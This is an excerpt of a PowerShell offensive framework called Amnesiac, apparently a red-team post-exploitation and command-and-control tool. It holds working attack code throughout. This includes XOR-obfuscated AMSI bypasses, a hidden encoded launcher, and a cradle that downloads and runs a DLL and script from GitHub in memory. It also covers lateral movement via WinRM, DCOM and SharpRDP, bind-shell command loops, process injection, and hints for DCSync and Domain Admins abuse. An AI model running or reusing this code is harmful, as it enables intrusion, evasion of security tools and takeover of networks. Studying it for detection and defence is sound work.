# !!AL-MAP-BEGIN!! Generated by AmnesiacLoader\Build.ps1 -- do not edit manually
$AmnesiacLoaderB64 = ""
$_alNs   = "CdERqDHEPc"
$_alStp  = "gNvaMXWTo5"
$_alConc = "W3gXkiEkdg"
$_alInj  = "fVZgW57XDK"
...
function Get-AmsiBypassSnippet {
    ...
    switch ($Technique) {
        'fail' {
            ...
            # XOR key=13 decodes type name at runtime — no static char-array sig for AmsiUtils.
        ...
        'session' {
            # XOR-decoded amsiSession null — key=13; avoids static sig for char-array encoded "amsiSession"
            return "try{`$_k=13;`$_t=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,76,96,126,100,88,121,100,97,126)|%{`$_-bxor`$_k})));`$_t.GetField([string]::new([char[]]([byte[]](108,96,126,100,94,104,126,126,100,98,99)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,`$null)}catch{}"
        }
...
function Get-PayloadLauncher {
    ...
    switch ($Launcher) {
        'ps' {
            ...
            return "powershell.exe -nop -ep bypass -w hidden -enc $b64"
        }
...
function Test-NetworkLogonToken {
    ...
    try {
        ...
        if ($id.AuthenticationType -in 'Kerberos','NTLM') {
            ...
            if ($domainPart -notin $localNames) { return $id.Name }
        }
        if (-not ('AmnesiacLsa' -as [type])) {
            Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
[StructLayout(LayoutKind.Sequential)] public struct AmnesiacLuid { public uint L; public int H; }
[StructLayout(LayoutKind.Sequential)] public struct AmnesiacLsaStr {
    public ushort Len; public ushort Max; public IntPtr Buf;
}
[StructLayout(LayoutKind.Sequential)] public struct AmnesiacLogonData {
    public uint Size; public AmnesiacLuid Id;
    public AmnesiacLsaStr User; public AmnesiacLsaStr Domain;
    public AmnesiacLsaStr AuthPkg; public uint LogonType;
}
public static class AmnesiacLsa {
    [DllImport("secur32.dll")] public static extern int LsaEnumerateLogonSessions(out int n, out IntPtr p);
    [DllImport("secur32.dll")] public static extern int LsaGetLogonSessionData(IntPtr id, out IntPtr d);
    [DllImport("secur32.dll")] public static extern int LsaFreeReturnBuffer(IntPtr p);
    public static string NewCredentialsUser() {
        int n; IntPtr list;
        if (LsaEnumerateLogonSessions(out n, out list) != 0) return null;
        try {
            IntPtr cur = list;
            for (int i = 0; i < n; i++) {
                IntPtr d = IntPtr.Zero;
                if (LsaGetLogonSessionData(cur, out d) == 0 && d != IntPtr.Zero) {
                    try {
                        var s = (AmnesiacLogonData)Marshal.PtrToStructure(d, typeof(AmnesiacLogonData));
                        if (s.LogonType == 9) {
                            string u = s.User.Len > 0 && s.User.Buf != IntPtr.Zero
                                ? Marshal.PtrToStringUni(s.User.Buf, s.User.Len / 2) : "";
                            string dom = s.Domain.Len > 0 && s.Domain.Buf != IntPtr.Zero
                                ? Marshal.PtrToStringUni(s.Domain.Buf, s.Domain.Len / 2) : "";
                            if (u.Length > 0) return (dom.Length > 0 ? dom + "\\" : "") + u;
                        }
                    } finally { LsaFreeReturnBuffer(d); }
                }
                cur = IntPtr.Add(cur, Marshal.SizeOf(typeof(AmnesiacLuid)));
            }
        } finally { LsaFreeReturnBuffer(list); }
        return null;
    }
}
'@ -ErrorAction SilentlyContinue
        }
        $nc = try { [AmnesiacLsa]::NewCredentialsUser() } catch { $null }
        if ($nc) { return "$nc (runas /netonly)" }
        return $false
    } catch { return $false }
}
...
function Show-OpsecBanner {
    ...
    $_nt = Test-NetworkLogonToken
    $tokenInfo   = if ($_nt) { $_nt } else { "(no network logon token)" }
    ...
    $autoState   = if ($global:AutoLoader) { "ON  (delivered on every session connect)" } else { "OFF (manual: 'load loader')" }
    ...
    Write-Host " [+] Auto-loader:      $autoState"
...
function Amnesiac {
	...
	param (
		...
		[switch]$ScanMode,
		[switch]$CheckTargets,
		[Alias('NonDomain','NoDomain','Detach')]
		[switch]$Detached,
		[switch]$Night
    )
	
	if($Detached -AND -not $HostIP){
		$_candidateIPs = @(Get-NetIPAddress -AddressFamily IPv4 |
		...
		if ($_candidateIPs.Count -eq 1) {
			$HostIP = $_candidateIPs[0]
			Write-Host " [*] Auto-detected operator IP: $HostIP (use -HostIP to override)" -Foreground green
		} elseif ($_candidateIPs.Count -gt 1) {
			Write-Output ""
			Write-Host " [*] Multiple IPs found — select your operator IP:" -Foreground yellow
			Write-Output ""
			for ($i = 0; $i -lt $_candidateIPs.Count; $i++) { Write-Output "  [$($i+1)] $($_candidateIPs[$i])" }
			Write-Output ""
			$_sel = (Read-Host " Choice").Trim()
			if ($_sel -match '^\d+$' -and [int]$_sel -ge 1 -and [int]$_sel -le $_candidateIPs.Count) {
				$HostIP = $_candidateIPs[[int]$_sel - 1]
			} else {
				Write-Host " [-] Invalid selection. Specify manually: Amnesiac -NonDomain -HostIP <IP>" -Foreground red
				break
			}
		} else {
			Write-Output ""
			Write-Host " [-] No eligible IP detected. Specify manually: Amnesiac -NonDomain -HostIP <IP>" -Foreground red
			Write-Output ""
			break
		}
	}
	...
	while ($true) {
		...
		if ($choice -match '^autoloader(\s+(on|off))?$') {
			if ($Matches[2] -eq 'on') {
				$global:AutoLoader = $true
				if ([string]::IsNullOrEmpty($AmnesiacLoaderB64)) {
					$global:Message = " [!] Auto-loader: ON but loader blob is empty — run AmnesiacLoader\Build.ps1 first"
				} else {
					$global:Message = " [+] Auto-loader: ON — AmnesiacLoader delivered on every session connect"
				}
			} elseif ($Matches[2] -eq 'off') {
				$global:AutoLoader = $false
				$global:Message = " [+] Auto-loader: OFF — use 'load loader' manually per session"
			} else {
				$state = if ($global:AutoLoader) { "ON" } else { "OFF" }
				$global:Message = " [+] Auto-loader: $state"
			}
			continue
		}
		...
		if ($choice -eq 'bootstrap') {
			...
			Write-Host ""
			Write-Host " [*] GitHub 3-liner — DLL bypass + load Amnesiac (no operator server, target has internet):" -ForegroundColor Cyan
			if ($AmnesiacLoaderB64 -and $_alNs -and $_alByp -and $_alPar) {
				$_ghUrl  = "https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/$_alNs.dll"
				$_ghSps  = "https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1"
				Write-Host "     `$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('$_ghUrl'))" -ForegroundColor White
				Write-Host "     `$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)" -ForegroundColor White
				Write-Host "     iex (New-Object Net.WebClient).DownloadString('$_ghSps');Amnesiac" -ForegroundColor White
			} else {
				Write-Host "     [!] AmnesiacLoader blob not embedded — run AmnesiacLoader\Build.ps1 first." -ForegroundColor Yellow
			}
			Write-Host ""
			continue
		}
...
"@
		...
		if ($commandParts[0] -eq 'bookmark' -and $commandParts[1] -match '^\d+$') {
			...
			# Compute end indices for the various session categories (sessions start at 6)
			$directAdminEndIndex = 5 + $global:directAdminSessions.Count
			...
			if ($sessionNumber -ge 6 -and $sessionNumber -le $directAdminEndIndex) {
				$selectedIndex = $sessionNumber - 6
			...
			elseif ($sessionNumber -gt $directAdminEndIndex -and $sessionNumber -le $listenerEndIndex) {
				$selectedIndex = $sessionNumber - 6 - $global:directAdminSessions.Count
				$bookmark = [PSCustomObject]@{
					'DisplayName' = " [$sessionNumber]"
			...
			elseif ($sessionNumber -gt $listenerEndIndex -and $sessionNumber -le $globalListenerEndIndex) {
				$selectedIndex = $sessionNumber - 6 - $global:directAdminSessions.Count - $global:listenerSessions.Count
				$bookmark = [PSCustomObject]@{
					'DisplayName' = " [$sessionNumber]"
		...
		if ($commandParts[0] -eq 'kill' -and $commandParts[1] -match '^\d+$') {
			...
			elseif ($sessionNumber -gt $directAdminEndIndex -and $sessionNumber -le $listenerEndIndex) {
				...
				if ($indexToRemove -ne -1) {
					...
					$desiredIndex = "[{0}]" -f ($indexToRemove + 6 + $global:directAdminSessions.Count) # Adjust for base numbering and other sessions' count
					$bookmarkToRemove = $global:bookmarks | Where-Object { $_.DisplayName -like "*$desiredIndex*" }
					if ($bookmarkToRemove) {
						$global:bookmarks.Remove($bookmarkToRemove) > $null
					}
			...
			elseif ($sessionNumber -gt $listenerEndIndex) {
				...
				if ($indexToRemove -ne -1) {
					...
					# Calculate the desiredIndex for the removed session
					$desiredIndex = "[{0}]" -f ($indexToRemove + 6 + $global:directAdminSessions.Count + $global:listenerSessions.Count) # Adjust for base numbering and other sessions' count
					$bookmarkToRemove = $global:bookmarks | Where-Object { $_.DisplayName -like "*$desiredIndex*" }
					if ($bookmarkToRemove) {
						$global:bookmarks.Remove($bookmarkToRemove) > $null
					}
		...
		switch ($choice) {
			...
			'6' {
				Write-Host ""
				Write-Host " Set engagement profile:" -ForegroundColor Cyan
				Write-Host "   [1] nondomained  — runas /netonly operator (Scenario 1)" -ForegroundColor Gray
				Write-Host "   [2] domained     — assumed breach box (Scenario 2)" -ForegroundColor Gray
				Write-Host ""
...
function Start-LocalShell {
    ...
    $_cmd = @{
        ...
        'Migrate' = {
            ...
            Write-Host "   Migrate ps <pid>   inject PS runspace via AmnesiacLoader (stealth, no PInject needed)" -ForegroundColor Yellow
            Write-Host "   Migrate <pid>      shellcode injection via PInject (load PInject first)" -ForegroundColor Yellow
            Write-Host ""
            Write-Host "   Process            list processes to find target PID" -ForegroundColor Gray
            Write-Host "   Migrate ps 1234    recommended: stealth, uses embedded AmnesiacLoader" -ForegroundColor Gray
        }
        'MonitorRead' = {
    ...
    $_kw = @{
        ...
        'PowerDACL'        = @{ tools=@('PowerDACL');             invoke='PowerDACL'
                                hint=@(" [*] Most actions use -TargetDomain <dom> -TargetServer <DC>"
                                       " [*] EnableAccount/DisableAccount/AddComputer/DeleteComputer/Set-DomainObject use -Domain/-Server"
                                       " [*] ─────────────────────────────────────────────────────────────────────"
                                       " [*]  DCSync -Target <user> -TargetDomain <dom> -TargetServer <DC>"
                                       " [*]  DCSync -Target <user> -TargetDomain <dom> -TargetServer <DC> -Remove"
                                       " [*]  GenericAll -Target <obj> -TargetDomain <dom> -TargetServer <DC> -Grantee <user>"
                                       " [*]  GenericAll ...  -GranteeDomain <dom> -GranteeServer <DC>  (cross-domain grantee)"
                                       " [*]  SetOwner -Target <obj> -TargetDomain <dom> -TargetServer <DC> -Owner <user>"
                                       " [*]  SetOwner ...  -OwnerDomain <dom> -OwnerServer <DC>  (cross-domain owner)"
                                       " [*]  ForceChangePass -Target <user> -Password <pass> -TargetDomain <dom> -TargetServer <DC>"
                                       " [*]  RBCD -Target <computer$> -Grantee <user> -TargetDomain <dom> -TargetServer <DC>"
                                       " [*]  RBCD ...  -GranteeDomain <dom> -GranteeServer <DC>  (cross-domain grantee)"
                                       " [*]  RBCD -Clear -Target <computer$> -TargetDomain <dom> -TargetServer <DC>"
                                       " [*]  SetSPN -Target <user> -TargetDomain <dom> -TargetServer <DC> [-SPN 'svc/host']"
                                       " [*]  RemoveSPN -Target <user> -TargetDomain <dom> -TargetServer <DC>"
                                       " [*]  AddToGroup -Target <user> -Group 'Domain Admins' -TargetDomain <dom> -TargetServer <DC>"
                                       " [*]  AddToGroup ...  -GroupDomain <dom> -GroupServer <DC>  (cross-domain group)"
                                       " [*]  RemoveFromGroup -Target <user> -Group 'Domain Admins' -TargetDomain <dom> -TargetServer <DC>"
                                       " [*]  RemoveFromGroup ...  -GroupDomain <dom> -GroupServer <DC>"
                                       " [*]  EnableAccount -Target <obj> -Domain <dom> -Server <DC>"
                                       " [*]  DisableAccount -Target <obj> -Domain <dom> -Server <DC>"
        ...
        'SessionHunter'    = @{ tools=@('Invoke-SessionHunter'); invoke=$null
                                hint=@(" [*] Non-domain (runas /netonly):  Invoke-SessionHunter -Domain <dom> -DomainController <DC-IP> [-UserName <dom\user> -Password <pass>]"
    ...
    while ($true) {
        ...
        if ($cmd -eq 'help' -or $cmd -eq '?') {
            ...
            Write-Host "   Kerb              " -NoNewline -ForegroundColor Yellow; Write-Host "Dump Kerberos TGTs (auto-runs Invoke-Kirby)"
            ...
            Write-Host "   SharpRDP          " -NoNewline -ForegroundColor Yellow; Write-Host "RDP-based remote exec (requires active session) -- SharpRDP computername=<ip> username=<dom\user> password=<pass>"
            ...
            Write-Host "   PowerDACL         " -NoNewline -ForegroundColor Yellow; Write-Host "Abuse AD DACLs (DCSync, GenericAll, RBCD, ForceChangePass...) -- PowerDACL -h for usage"
            Write-Host "   CheckWebDAV       " -NoNewline -ForegroundColor Yellow; Write-Host "Check WebDAV/EFS status and hunt sessions across domain -- CheckWebDAV -h for usage"
            Write-Host "   CheckSMBSigning   " -NoNewline -ForegroundColor Yellow; Write-Host "Scan for hosts without SMB signing -- CheckSMBSigning -h for usage"
            Write-Host "   CollectAD         " -NoNewline -ForegroundColor Yellow; Write-Host "LDAP enumeration (Users, Computers, Groups, GPOs, OUs, DCs...) -- CollectAD -h for usage"
            Write-Output ""
        ...
        if ($cmd -match '^(\S+)\s+-h(?:elp)?\s*$') {
            ...
            if ($kwHMatch -and $_kw[$kwHMatch].hint) {
                Write-Output ""
                $_kw[$kwHMatch].hint | ForEach-Object { Write-Host $_ -ForegroundColor Cyan }
                Write-Output ""
            } elseif ($kwHMatch) {
                Write-Host " [*] No usage hints available for '$kwH'. Load it and run without args for built-in help." -ForegroundColor Yellow
            }
            continue
        }
        ...
        if ($kwMatch) {
            ...
            if ($allOk) {
                ...
                if ($kwDef.hint) {
                    Write-Output ""
                    $kwDef.hint | ForEach-Object { Write-Host $_ -ForegroundColor Cyan }
                }
                if ($kwDef.invoke) {
                    Write-Output ""
        ...
        # ── servelog: show HTTP access log from running serve ────────────────
        if ($cmd -ieq 'servelog') {
            $_logFile = Join-Path $global:AmnesiacRoot '_serve.log'
            if (Test-Path $_logFile) {
                Get-Content $_logFile | ForEach-Object {
                    $color = if ($_ -match '^[\d:]+\s+200\s') { 'Green' } else { 'DarkYellow' }
                    Write-Host " $_" -ForegroundColor $color
                }
            } else {
                Write-Host " [*] No requests logged yet (serve not started or no requests received)" -ForegroundColor DarkGray
            }
            continue
        }

        # ── serve: start operator HTTP server from local shell ───────────────
        if ($cmd -ieq 'serve') {
            if ($global:FileServerProcess -and -not $global:FileServerProcess.HasExited) {
                Write-Host " [+] serve already running (PID $($global:FileServerProcess.Id))" -ForegroundColor Green
                Write-Host " [*] Tools: $global:ServerURL" -ForegroundColor Cyan
            } else {
        ...
        # Requires target user to be in Remote Management Users (WinRM access).
        # Delivers the bind shell inline payload directly over the encrypted WinRM
        # channel via Invoke-Command -AsJob. No serve, no disk write on target.
        if ($cmd -match '^winrm\b(.*)') {
            $_wArgs = $Matches[1].Trim()
            if (-not $_wArgs -or $_wArgs -match '^help$') {
                Write-Host " Usage: winrm computername=<IP> username=<domain\user> password=<pass>" -ForegroundColor Yellow
                Write-Host "        Delivers bind shell payload via WinRM — no active session required." -ForegroundColor DarkGray
                Write-Host "        Requires target user in 'Remote Management Users' (port 5985)." -ForegroundColor DarkGray
                if (-not $global:LastInlinePS) {
                    Write-Host " [!] No payload ready — go through Bind Shell menu first." -ForegroundColor Yellow
                }
                continue
            }
            $_wF = @{}
            ($_wArgs -split '\s+') | ForEach-Object { if ($_ -match '^([^=]+)=(.*)$') { $_wF[$Matches[1].ToLower()] = $Matches[2] } }
            $_wTarget   = $_wF['computername']
            $_wUser     = $_wF['username']
            $_wPass     = $_wF['password']
            if (-not $_wTarget -or -not $_wUser -or -not $_wPass) {
                Write-Host " [!] computername, username, and password are all required." -ForegroundColor Yellow; continue
            }
            if (-not $global:LastInlinePS) {
                Write-Host " [!] No payload ready — go through Bind Shell menu first, then run winrm." -ForegroundColor Yellow; continue
            }
            ...
            # Test WinRM reachability before attempting delivery
            Write-Host " [*] Testing WinRM on $_wTarget ..." -ForegroundColor Cyan
            try {
                Test-WSMan -ComputerName $_wTarget -Credential $_wCred -Authentication Negotiate -ErrorAction Stop | Out-Null
                Write-Host " [+] WinRM accessible on $_wTarget" -ForegroundColor Green
            } catch {
                Write-Host " [-] WinRM not accessible: $($_.Exception.Message)" -ForegroundColor Red
                Write-Host "     Ensure target is in Remote Management Users and port 5985 is reachable." -ForegroundColor DarkYellow
                continue
            }

            # Deliver inline payload as a background job so the pipe server keeps running
            try {
                $_wSB = [scriptblock]::Create($global:LastInlinePS)
                ...
                Write-Host " [+] Payload delivered to $_wTarget via WinRM (running as background job)" -ForegroundColor Green
                Write-Host " [*] Type 'back' — listener will catch the named pipe session" -ForegroundColor Cyan
                # Register for bind shell listener
                $global:AllUserDefinedTargets = @((@($global:AllUserDefinedTargets) + $_wTarget) | Where-Object { $_ } | Select-Object -Unique)
            } catch {
                Write-Host " [-] WinRM delivery failed: $($_.Exception.Message)" -ForegroundColor Red
            }
            continue
        }

        # ── winrmscan: find which hosts allow WinRM for a given credential ───────
        if ($cmd -match '^winrmscan\b(.*)') {
            $_wsArgs = $Matches[1].Trim()
            $_wsF = @{}
            ($_wsArgs -split '\s+') | ForEach-Object { if ($_ -match '^([^=]+)=(.*)$') { $_wsF[$Matches[1].ToLower()] = $Matches[2] } }
            $_wsUser = $_wsF['username']
            $_wsPass = $_wsF['password']
            $_wsRange = $_wsF['range']
            if (-not $_wsUser -or -not $_wsPass) {
                Write-Host " Usage: winrmscan username=<domain\user> password=<pass> [range=10.3.10.1-254]" -ForegroundColor Yellow; continue
            }
            $_wsSec  = ConvertTo-SecureString $_wsPass -AsPlainText -Force
            $_wsCred = New-Object System.Management.Automation.PSCredential($_wsUser, $_wsSec)
            # Build target list: explicit range, or registered targets, or /24 of operator IP
            if ($_wsRange -and $_wsRange -match '^([\d.]+)-(\d+)$') {
                $_wsBase = $Matches[1] -replace '\.\d+$','.'
                $_wsStart = ($Matches[1] -split '\.')[-1] -as [int]
                $_wsEnd   = $Matches[2] -as [int]
                $_wsHosts = $_wsStart..$_wsEnd | ForEach-Object { "$_wsBase$_" }
            } elseif ($global:AllUserDefinedTargets) {
                $_wsHosts = $global:AllUserDefinedTargets
            } else {
                $_wsBase = ($global:IP -replace '\.\d+$','.')
                $_wsHosts = 1..254 | ForEach-Object { "$_wsBase$_" }
            }
            Write-Host " [*] Scanning $($_wsHosts.Count) hosts for WinRM (port 5985) ..." -ForegroundColor Cyan
            $_wsHits = [System.Collections.Generic.List[string]]::new()
            $_wsHosts | ForEach-Object {
                $_wsH = $_
                # Async TCP probe with 500ms timeout — avoids blocking on unreachable hosts
                $_t = New-Object Net.Sockets.TcpClient
                try {
                    $_ar = $_t.BeginConnect($_wsH, 5985, $null, $null)
                    if ($_ar.AsyncWaitHandle.WaitOne(500)) {
                        try { $_t.EndConnect($_ar) } catch {}
                        # Port open — test WSMan auth
                        try {
                            Test-WSMan -ComputerName $_wsH -Credential $_wsCred -Authentication Negotiate -ErrorAction Stop | Out-Null
                            Write-Host " [+] $_wsH — WinRM OK" -ForegroundColor Green
                            $_wsHits.Add($_wsH)
                        } catch {
                            $_em = $_.Exception.Message
                            $_hint = if ($_em -match 'Code="5"')  { 'access denied (not in Remote Management Users)' }
                            ...
                            Write-Host " [-] $_wsH — $_hint" -ForegroundColor DarkYellow
                        }
                    }
                } catch {} finally { $_t.Close() }
            }
            if ($_wsHits.Count -eq 0) {
                Write-Host " [-] No hosts with WinRM access found for $_wsUser" -ForegroundColor Red
            } else {
                Write-Host " [*] $($_wsHits.Count) host(s) with WinRM access: $($_wsHits -join ', ')" -ForegroundColor Green
                Write-Host "     Run: winrm computername=<IP> username=$_wsUser password=$_wsPass" -ForegroundColor Cyan
            }
            continue
        }

        # ── dcom: DCOM-based delivery — no local admin, needs active session ─────
        # ShellWindows/ShellBrowserWindow attach to existing explorer.exe via DCOM Access
        # permission (domain users allowed by default — no local admin required).
        # MMC20 launches a new mmc.exe process and requires DCOM Launch permission (admin).
        if ($cmd -match '^dcom\b(.*)') {
            $_dArgs = $Matches[1].Trim()
            if (-not $_dArgs -or $_dArgs -match '^help$') {
                Write-Host " Usage: dcom computername=<IP> [method=ShellWindows|ShellBrowserWindow|MMC20]" -ForegroundColor Yellow
                Write-Host "        Default: ShellWindows — no local admin, requires active interactive session on target." -ForegroundColor DarkGray
                Write-Host "        ShellBrowserWindow: fallback if ShellWindows fails." -ForegroundColor DarkGray
                Write-Host "        MMC20: requires local admin on target." -ForegroundColor DarkGray
                if (-not $global:LastSharpRDPCradleFile) {
                    Write-Host " [!] No pipe payload — generate a stealth bind shell payload first." -ForegroundColor Yellow
                }
                continue
            }
            $_dF = @{}
            ($_dArgs -split '\s+') | ForEach-Object { if ($_ -match '^([^=]+)=(.*)$') { $_dF[$Matches[1].ToLower()] = $Matches[2] } }
            $_dTarget = $_dF['computername']
            $_dMethod = if ($_dF['method']) { $_dF['method'] } else { 'ShellWindows' }
            if (-not $_dTarget) { Write-Host " [!] computername is required." -ForegroundColor Yellow; continue }
            if (-not $global:LastSharpRDPCradleFile) {
            ...
            try {
                if ($_dMethod -ieq 'ShellWindows') {
                    $_dComType = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C91F3880", $_dTarget)
                    $_dComObj  = [System.Activator]::CreateInstance($_dComType)
                    $_dItem    = $null
                    try { $_dItem = $_dComObj.Item() } catch {}
                    if (-not $_dItem) { throw "no explorer windows on target (session locked or no active desktop)" }
                    $_dItem.Document.Application.ShellExecute("powershell.exe", $_dCradle, "c:\windows\system32", $null, 0)
                    $_dOk = $true
                } elseif ($_dMethod -ieq 'ShellBrowserWindow') {
                    $_dComType = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", $_dTarget)
                    $_dComObj  = [System.Activator]::CreateInstance($_dComType)
                    $_dComObj.Document.Application.ShellExecute("powershell.exe", $_dCradle, "c:\windows\system32", $null, 0)
                    $_dOk = $true
                } elseif ($_dMethod -ieq 'MMC20') {
                    $_dComType = [Type]::GetTypeFromProgID("MMC20.Application", $_dTarget)
                    $_dComObj  = [System.Activator]::CreateInstance($_dComType)
                    $_dComObj.Document.ActiveView.ExecuteShellCommand("powershell.exe", $null, $_dCradle, "7")
                    $_dOk = $true
                } else {
                    Write-Host " [!] Unknown method '$_dMethod'. Use: ShellWindows, ShellBrowserWindow, or MMC20." -ForegroundColor Yellow
                }
                if ($_dOk) {
                    Write-Host " [+] DCOM ($_dMethod) executed on $_dTarget" -ForegroundColor Green
                    $global:AllUserDefinedTargets = @((@($global:AllUserDefinedTargets) + $_dTarget) | Where-Object { $_ } | Select-Object -Unique)
                    Write-Host " [*] Bind shell target registered: $_dTarget — type 'back' to start listener" -ForegroundColor Cyan
                }
            } catch {
                Write-Host " [-] DCOM failed ($_dMethod): $($_.Exception.Message)" -ForegroundColor Red
                Write-Host " [*] ShellWindows/ShellBrowserWindow: need active interactive session on target" -ForegroundColor DarkGray
                Write-Host " [*] MMC20: requires local admin on target" -ForegroundColor DarkGray
            }
            continue
        }

        # ── SharpRDP: RDP-based remote command execution ─────────────────────
        if ($cmd -match '^SharpRDP\s*(.*)') {
            $rdpArgs = $Matches[1].Trim()
            $cacheKey = $global:ToolCache.Keys | Where-Object { $_ -ieq 'Invoke-SharpRDP' } | Select-Object -First 1
            if (-not $cacheKey -and (Fetch-ToolFromGitHub -ToolName 'Invoke-SharpRDP')) { $cacheKey = 'Invoke-SharpRDP' }
            if ($cacheKey) {
                try {
                    Invoke-Expression $global:ToolCache[$cacheKey]
                    if ($rdpArgs) {
                        Write-Host " [+] Invoke-SharpRDP loaded — executing..." -ForegroundColor Green
                        # Load SharpRDP assembly directly to bypass Invoke-SharpRDP's Split(" ")
                        # which breaks command= values containing spaces (e.g. powershell args)
                        if (-not ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'SharpRDP' })) {
                            ...
                            if ($_srdpM.Success) {
                                $_sms1 = New-Object IO.MemoryStream(,[Convert]::FromBase64String($_srdpM.Groups[1].Value))
                                $_sgz  = New-Object IO.Compression.GzipStream($_sms1,[IO.Compression.CompressionMode]::Decompress)
                                $_sms2 = New-Object IO.MemoryStream; $_sgz.CopyTo($_sms2); $_sgz.Close(); $_sms1.Close()
                                [System.Reflection.Assembly]::Load($_sms2.ToArray()) | Out-Null
                            }
                        }
                        # Parse auth fields; command= and arguments= from user input are replaced
                        # with a download cradle that is all-lowercase (unaffected by SharpRDP's cmd.ToLower())
                        $_srdpF = @{}
                        ($rdpArgs -split '\s+') | ForEach-Object { if ($_ -match '^([^=]+)=(.*)$') { $_srdpF[$Matches[1].ToLower()] = $Matches[2] } }
                        $_srdpOpIP = if ($global:IP) { $global:IP } else { $env:COMPUTERNAME }
                        if ($global:LastSharpRDPCradleFile) {
                            ...
                            [SharpRDP.Program]::Main(@(
                                ...
                                "username=$($_srdpF['username'])",
                                "password=$($_srdpF['password'])",
                                "command=$_srdpPS"
                            ))
                        } else {
                            Write-Host " [!] No pipe payload file — generate a stealth bind shell payload first" -ForegroundColor Yellow
                        }
                        # Auto-register delivery target so the bind shell listener doesn't prompt again
                        if ($rdpArgs -match '(?i)computername=([^\s]+)') {
                            ...
                            if ($_rdpTarget) {
                                ...
                                Write-Host " [*] Bind shell target registered: $_rdpTarget — listener ready, type 'back'" -ForegroundColor Cyan
                            }
                        }
                    } else {
                        Write-Host " [+] Invoke-SharpRDP loaded." -ForegroundColor Green
                        if ($global:LastSharpRDPB64) {
                            Set-Clipboard -Value $global:LastSharpRDPB64
                        ...
                        Write-Host "     sharprdp computername=<IP> username=<domain>\<user> password=<pass>" -ForegroundColor Yellow
                        Write-Host "     (command= is auto-built from pipe payload — no need to paste b64)" -ForegroundColor DarkGray
                    }
                } catch {
                    Write-Host " [-] SharpRDP failed: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host " [-] 'Invoke-SharpRDP' not in cache. Add Invoke-SharpRDP.ps1 to Tools\ and run: modules reload" -ForegroundColor Red
            }
            continue
        }
        ...
        if ($cmd -imatch '^Migrate\s+ps\s+(\d+)$') {
            ...
            if (-not $AmnesiacLoaderB64) {
                Write-Host " [!] AmnesiacLoader not embedded — run AmnesiacLoader\Build.ps1 first." -ForegroundColor Red; continue
            }
            if (-not $_alNs -or -not $_alInj -or -not $_alInPS) {
                Write-Host " [!] AL name-map vars not set — run AmnesiacLoader\Build.ps1 and reload." -ForegroundColor Red; continue
            }
            ...
            if (-not $_alMig) {
                ...
                } catch { Write-Host " [-] Failed to load AmnesiacLoader: $($_.Exception.Message)" -ForegroundColor Red; continue }
            }
            ...
            if (-not $_injOk) {
                Write-Host " [!] Injection failed — trying hidden PS process..." -ForegroundColor Yellow
                $_spawnOk = $false
                try {
            ...
            try {
                ...
                Write-Host " [+] Session connected. Type 'back' to return." -ForegroundColor Green
                ...
                try {
                    while ($true) {
                        ...
                        } catch { Write-Host " [-] Pipe error: $($_.Exception.Message)" -ForegroundColor Red; break }
                    }
                } finally { [console]::TreatControlCAsInput = $false }
                try { $mgClient.Close() } catch {}
            } catch { Write-Host " [-] Failed to connect to migrated process: $($_.Exception.Message)" -ForegroundColor Red }
            continue
        }
        ...
        if ($cmd -imatch '^Migrate\s+(\d+)$') {
            ...
            if (-not (Get-Command 'PInject' -ErrorAction SilentlyContinue)) {
                Write-Host " [-] PInject not loaded. Run 'PInject' first to load the module." -ForegroundColor Red
                Write-Host "     Or use stealth variant: Migrate ps $targetPid  (no PInject needed)" -ForegroundColor Yellow
                continue
            }
            $PN = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
            ...
            } catch { Write-Host " [-] Failed to connect: $($_.Exception.Message)" -ForegroundColor Red }
            continue
        }

        # ── Fall-through: run as PowerShell ───────────────────────────────────
        try {
            $result = & ([scriptblock]::Create($cmd)) 2>&1
...
function Display-SessionMenu {
 ...
 ###     ### ###       ### ###    #### ########## ######## ########### ###     ###  ########  ')
    ...
    Write-Output ""
    Write-Host " Local:  $_localFQDN  [$_localUser]" -Foreground cyan
	...
	if($ShowSessions){
		...
		if ($global:listenerSessions.Count -gt 0) {
			Write-Output ""
			Write-Host " Reverse Shell Sessions:" -Foreground yellow
		...
		if ($global:MultipleSessions.Count -gt 0) {
			Write-Output ""
			Write-Host " Bind Shell Sessions:" -Foreground yellow
...
function New-StealthScript {
	...
	if (-not $IsServer) {
		...
		$loop = "while(`$true){`$$v4=`$$v2.ReadLine();if(`$$v4-eq 'exit'){break};try{`$$v5=& ([scriptblock]::Create(`$$v4)) *>&1|Out-String;`$$v5-split([char]10)|%{`$$v3.WriteLine(`$_.TrimEnd())}}catch{`$$vb=`$_.Exception.Message;`$$vb-split([char]10)|%{`$$v3.WriteLine(`$_)}};`$$v3.WriteLine('$($global:EndMarker)');`$$v3.Flush()};`$$v1.Close();`$$v1.Dispose()"
	} else {
		...
		$loop = "while(`$true){if(-not `$$v1.IsConnected){break};`$$v4=`$$v2.ReadLine();if(`$$v4-eq 'exit'){break}else{try{`$$v5=& ([scriptblock]::Create(`$$v4)) *>&1|Out-String;`$$v5-split([char]10)|%{`$$v3.WriteLine(`$_.TrimEnd())}}catch{`$$vb=`$_.Exception.Message;`$$vb-split([char]10)|%{`$$v3.WriteLine(`$_)}};`$$v3.WriteLine('$($global:EndMarker)');`$$v3.Flush()}};`$$v1.Disconnect();`$$v1.Dispose()"
	}
	...
	$stealthBypass = Get-AmsiBypassSnippet -Technique 'pageguard'
